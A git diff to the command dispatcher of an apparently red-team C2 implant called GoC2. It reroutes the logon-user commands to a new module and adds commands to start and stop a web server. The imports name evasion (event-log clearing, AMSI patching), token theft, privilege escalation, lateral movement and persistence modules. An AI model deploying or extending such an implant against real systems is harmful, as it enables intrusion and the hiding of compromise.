@@ -33,7 +33,6 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listservices"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listshares"
 
-	//"github.com/latortuga71/GoC2/internal/modules/enumeration/screenshot"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/cleareventlog"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/hookchecker"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/patchamsi"
@@ -52,6 +51,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/enableprivilege"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/enumtokens"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/getsystem"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/logonuser"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/rev2self"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/stealtoken"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/admincheck"
@@ -59,6 +59,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/loggedonusers"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/pivot"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/webserver"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/addusertogroup"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/crontab"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/launchitems"
@@ -233,9 +234,9 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	//	result, cmdError = screenshot.Screenshot()
 	//	screenshotTask = true
 	case "logon-user-netonly":
-		result, cmdError = runbinary.RunAsNetOnly(t.Args)
+		result, cmdError = logonuser.LogonUserNetOnly(t.Args)
 	case "logon-user":
-		result, cmdError = runbinary.RunAs(t.Args)
+		result, cmdError = logonuser.LogonUser(t.Args)
 	case "run":
 		result, cmdError = runbinary.RunBinary(t.Args)
 	case "whoami":
@@ -406,6 +407,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "stop-http-pivot":
 		pivot.StopHTTPPivot()
 		result, cmdError = "Stopped HTTP Pivot", nil
+	case "start-websrv":
+		result, cmdError = webserver.StartWebServer(t.Args)
+	case "stop-websrv":
+		result, cmdError = webserver.StopWebServer()
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
